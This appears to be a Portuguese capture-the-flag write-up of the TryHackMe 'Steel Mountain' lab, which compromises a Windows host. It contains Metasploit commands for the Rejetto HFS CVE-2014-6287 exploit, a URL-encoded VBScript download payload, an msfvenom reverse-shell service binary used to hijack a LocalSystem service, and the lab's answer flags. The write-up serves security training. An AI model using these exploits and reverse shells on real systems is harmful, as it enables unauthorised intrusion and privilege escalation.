---
layout: writeup
title: Steel Mountain
platform: thm
difficulty: easy
os: windows
---

> **Dificuldade**: Fácil (opinião: médio)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## Scan

```
PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft IIS httpd 8.5
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds Windows Server 2008 R2 - 2012
3389/tcp  open     ssl/ms-wbt-server (RDP)
8080/tcp  open     http         HttpFileServer httpd 2.3 (HFS)
49152-6   open     msrpc
```

Host: `STEELMOUNTAIN` (Mr. Robot reference).

## Enumeração

Porta 8080 expõe **Rejetto HFS (HttpFileServer) 2.3** — versão vulnerável a **CVE-2014-6287** (Remote Command Execution).

```bash
searchsploit Http File Server 2.3
```

Múltiplos exploits disponíveis. Mais conveniente: módulo Metasploit.

## Acesso Inicial — CVE-2014-6287

### Via Metasploit

```
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.113.208
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost tun0
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

Payload base — vbscript injetado via URL com macro `%00{.save|...|...}`:

```
GET /?search=%00{.save%7C%25TEMP%25%5CAbJdcvoOdyR.vbs%7CSet+x%3DCreateObject%28%22Microsoft.XMLHTTP%22%29%0D%0A...
```

Meterpreter session aberta como `STEELMOUNTAIN\bill`.

### Sem Metasploit (alternativa)

1. Baixar exploit Python (49125.py)
2. Hospedar `nc.exe` em `python -m http.server 80`
3. Listener `nc -lvnp 4444`
4. Executar exploit Python — alvo baixa nc.exe e dispara conexão reversa

## User Flag

```
C:\Users\bill\Desktop\user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

## Pós-Exploração — PowerUp

```
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

Vulnerabilidades encontradas:

- **AdvancedSystemCareService9** — Unquoted Service Path + Modifiable Service Files (`ASCService.exe` writável por `bill`)
- `CanRestart: True` → bill pode reiniciar o serviço
- Serviço roda como `LocalSystem`

## PrivEsc — Service Binary Hijacking

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.18.21.69 LPORT=4443 \
  -e x86/shikata_ga_nai \
  -f exe-service -o Advanced.exe
```

Upload + replace + restart:

```
meterpreter > upload /home/tenas/TryHackMe/steel/Advanced.exe
meterpreter > shell

C:\> sc stop AdvancedSystemCareService9
C:\> xcopy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
# (overwrite: Yes)

# Listener no atacante:
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4443
msf6 exploit(multi/handler) > run -j

C:\> sc start AdvancedSystemCareService9
```

Quando o serviço inicia, executa o binário malicioso **como LocalSystem**:

```
meterpreter > sessions 2
C:\Windows\system32> whoami
nt authority\system
```

## Root Flag

```
C:\> type C:\Users\Administrator\Desktop\root.txt
9af5f314f57607c00fd09803a587db80
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap → HFS 2.3 :8080 |
| Vuln | CVE-2014-6287 — Rejetto HFS macro injection |
| Exploit | metasploit `rejetto_hfs_exec` ou Python PoC |
| Foothold | meterpreter como `bill` |
| Enum PrivEsc | PowerUp Invoke-AllChecks → Modifiable Service Binary |
| PrivEsc | Replace `ASCService.exe` + `sc start` → shell SYSTEM |
